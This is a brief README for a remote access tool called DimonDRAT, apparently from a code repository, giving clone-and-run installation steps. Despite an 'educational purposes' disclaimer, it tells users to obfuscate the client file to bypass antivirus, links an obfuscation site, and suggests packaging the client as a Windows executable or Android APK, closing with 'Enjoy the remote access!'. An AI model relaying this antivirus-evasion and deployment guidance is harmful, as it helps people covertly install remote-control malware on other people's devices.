# DimonDRAT
### Description: I developed this piece of software only for educational purposes, I wanted to improve my coding skills and system remote administration.
# Installation:

!NOTE! : To bypass antivirus obfuscate the client.py file!!!
Good online obfuscator: https://pyob.oxyry.com/

1. git clone https://github.com/SegYT/DimonDRAT
2. cd DimonDRAT
3. pip install -r requirements.txt
4. chmod +x main.py
5. ./main.py
6. for the client you can play with packaging and convert it to an executable using py2exe or converting it directly to apk using kivy buildozer, see tutorials on how to convert to apk.
7. Enjoy the remote access!
